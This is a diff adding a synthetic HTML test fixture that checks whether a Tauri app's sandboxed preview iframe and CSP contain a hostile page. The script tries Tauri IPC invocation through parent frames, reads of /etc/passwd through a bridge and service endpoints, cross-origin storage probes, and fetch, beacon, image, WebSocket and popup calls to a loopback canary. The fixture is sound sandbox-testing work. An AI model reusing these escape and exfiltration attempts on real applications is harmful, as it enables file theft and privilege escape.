@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>R09-A10 malicious HTML preview fixture</title>
+<style>body{font:16px/1.5 system-ui;color:#243;} .badge{color:#a33}</style>
+<!--
+  R09-T05 A10 合成恶意样本（不含任何真实系统文件内容）。
+  模板占位符由 scripts/rust-tauri/r09_t05.py 在 POST /lingxi/v1/preview/html 前替换：
+    http://127.0.0.1:51873  真实服务 loopback base URL
+    http://127.0.0.1:51872   loopback canary base URL（脚本/图片/beacon 外发探针）
+    51872   canary 端口（WebSocket 探针）
+  该文档由服务以 CSP `connect-src 'none'; ... frame-ancestors ...` 提供给
+  沙箱 iframe（sandbox="allow-scripts"）。期望：脚本可运行，但拿不到宿主/
+  服务能力，任何 connect/img/ws/beacon 外发被 CSP 拦截且 canary 零命中。
+-->
+</head>
+<body>
+<h1>R09-A10 malicious preview</h1>
+<p class="badge">synthetic-canary-fixture — no real system content</p>
+<pre id="echo"></pre>
+<script>
+(function () {
+  "use strict";
+  var report = {
+    kind: "r09-a10-preview-report",
+    href: location.href,
+    previewTokenFromUrl: null,
+    checks: {},
+    attempts: [],
+    cspViolations: []
+  };
+  function note(key, value) { report.checks[key] = value; }
+  // 立即向父窗口声明"脚本已运行"（不依赖网络/计时，作为 script-ran 证据）。
+  try { parent.postMessage({ kind: "r09-a10-preview-alive", href: location.href }, "*"); } catch (_) {}
+  var pendingFetches = [];
+  function attempt(name, fn) {
+    // 先同步登记"已发起"，再按微任务更新结果：headless dump-dom 下跨源沙箱
+    // iframe 的 setTimeout 不保证在快照前运行，但 Promise 微任务会；网络探针的
+    // 最终"无外发"判据由服务端 loopback canary 零命中独立证明。
+    var entry = { name: name, outcome: "initiated" };
+    report.attempts.push(entry);
+    try {
+      var value = fn();
+      if (value && typeof value.then === "function") {
+        var tracked = value.then(
+          function () { entry.outcome = "settled"; },
+          function (error) { entry.outcome = "rejected"; entry.error = String((error && error.name) || error); }
+        );
+        if (name.indexOf("fetch") === 0) pendingFetches.push(tracked);
+      }
+    } catch (error) {
+      entry.outcome = "threw";
+      entry.error = String((error && error.name) || error);
+    }
+  }
+  try { report.previewTokenFromUrl = new URLSearchParams(location.search).get("previewToken"); } catch (_) {}
+  try { document.getElementById("echo").textContent = "PREVIEW-TOKEN-SEEN:" + String(report.previewTokenFromUrl); } catch (_) {}
+
+  window.addEventListener("securitypolicyviolation", function (event) {
+    report.cspViolations.push({ directive: event.effectiveDirective || event.violatedDirective || "", blockedURI: event.blockedURI || "" });
+  });
+
+  // 1) Tauri 原生桥/IPC 尝试：预览文档是跨源沙箱 iframe，不能拿到 app 主 frame 的注入面。
+  note("tauriGlobalType", typeof window.__TAURI__);
+  note("tauriInternalsType", typeof window.__TAURI_INTERNALS__);
+  note("tauriCanaryInvoke", "not-attempted");
+  attempt("tauri-invoke-direct", function () {
+    if (window.__TAURI_INTERNALS__ && typeof window.__TAURI_INTERNALS__.invoke === "function") {
+      return window.__TAURI_INTERNALS__.invoke("a10_canary_write_marker", { source: "preview-iframe" });
+    }
+    throw new Error("a10-tauri-bridge-absent");
+  });
+  attempt("tauri-invoke-parent", function () {
+    return parent.__TAURI_INTERNALS__.invoke("a10_canary_write_marker", { source: "preview-parent" });
+  });
+  attempt("tauri-global-parent", function () {
+    return parent.__TAURI__.core.invoke("a10_canary_write_marker");
+  });
+  attempt("hana-parent", function () {
+    return parent.hana && parent.hana.fs && parent.hana.fs.readFile("/etc/passwd");
+  });
+
+  // 2) 跨源 DOM/storage 访问尝试：sandbox 无 allow-same-origin → 不透明源。
+  function probe(label, fn) {
+    try { note(label, String(fn())); }
+    catch (error) { note(label, "blocked:" + String((error && error.name) || error)); }
+  }
+  probe("parentDocument", function () { return !!parent.document; });
+  probe("parentLocationHref", function () { return String(parent.location.href); });
+  probe("parentLocalStorage", function () { return !!parent.localStorage; });
+  probe("topDocument", function () { return !!top.document; });
+  probe("topLocalStorage", function () { return !!top.localStorage; });
+  probe("parentTauriInternals", function () { return typeof parent.__TAURI_INTERNALS__; });
+
+  // 3) 服务能力/token 外带尝试：CSP connect-src 'none' 应全部拒绝。
+  attempt("fetch-service-api", function () { return fetch("http://127.0.0.1:51873/lingxi/v1/browser/workspaces"); });
+  attempt("fetch-service-fs", function () { return fetch("http://127.0.0.1:51873/lingxi/v1/fs/read?path=%2Fetc%2Fpasswd"); });
+  attempt("fetch-relative-fs", function () { return fetch("/lingxi/v1/fs/read?path=%2Fetc%2Fpasswd"); });
+  attempt("fetch-canary-token", function () { return fetch("http://127.0.0.1:51872/preview-fetch-token"); });
+  attempt("beacon-canary", function () {
+    var sent = navigator.sendBeacon ? navigator.sendBeacon("http://127.0.0.1:51872/preview-beacon", "canary") : false;
+    if (!sent) { throw new Error("beacon-blocked-or-unsupported"); }
+  });
+  attempt("image-canary", function () {
+    return new Promise(function (resolve, reject) {
+      var image = new Image();
+      image.onload = function () { resolve("img-loaded"); };
+      image.onerror = function () { reject(new Error("img-blocked")); };
+      image.src = "http://127.0.0.1:51872/preview-image";
+    });
+  });
+  attempt("websocket-canary", function () {
+    return new Promise(function (resolve, reject) {
+      var socket = new WebSocket("ws://127.0.0.1:51872/preview-ws");
+      socket.onopen = function () { resolve("ws-open"); };
+      socket.onerror = function () { reject(new Error("ws-blocked")); };
+    });
+  });
+  attempt("popup-canary", function () {
+    var opened = window.open("http://127.0.0.1:51872/preview-popup");
+    if (!opened) { throw new Error("popup-blocked"); }
+  });
+
+  // 4) 向父窗口请求 token / 上报探针结果（父窗口是允许来源的真实 app 模拟页）。
+  function send() {
+    report.tokenRequest = "requested";
+    try { parent.postMessage({ kind: "r09-a10-token-request" }, "*"); } catch (_) {}
+    try { parent.postMessage(report, "*"); } catch (error) { report.postMessageError = String(error); }
+  }
+  // 微任务链：fetch 的 CSP 拒绝在微任务内可见，dump 前即可回传完整报告；
+  // 另保留一个保守的定时器兜底（若浏览器允许定时器则重复上报，父窗口幂等记录）。
+  Promise.all(pendingFetches).then(send);
+  setTimeout(send, 1500);
+})();
+</script>
+</body>
+</html>
